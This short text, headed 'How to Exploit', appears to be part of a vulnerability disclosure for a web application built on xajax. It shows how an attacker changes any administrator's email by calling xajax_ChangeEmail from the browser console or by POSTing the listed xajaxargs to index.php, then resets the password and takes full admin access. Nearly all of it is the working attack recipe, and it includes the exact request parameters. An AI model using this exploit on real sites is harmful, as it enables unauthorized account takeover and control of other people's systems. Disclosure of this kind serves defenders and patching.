How to Exploit
-------
No checking is done to verify you own that email address.  You can
simply submit a post request with the following arguments, to change
any admins email with your own (or a temporary one), and then reset
their password, then get full admin access.

You can download firebug for firefox, and simply run in the console
"xajax_ChangeEmail(ADMIN_ID, EMAIL_TO_CHANGE_TO)", otherwise you need
to send these variables to index.php via POST:

xxajax: ChangeEmail
xajaxargs[]: ADMIN_ID
xajaxargs[]: EMAIL_TO_CHANGE_TO
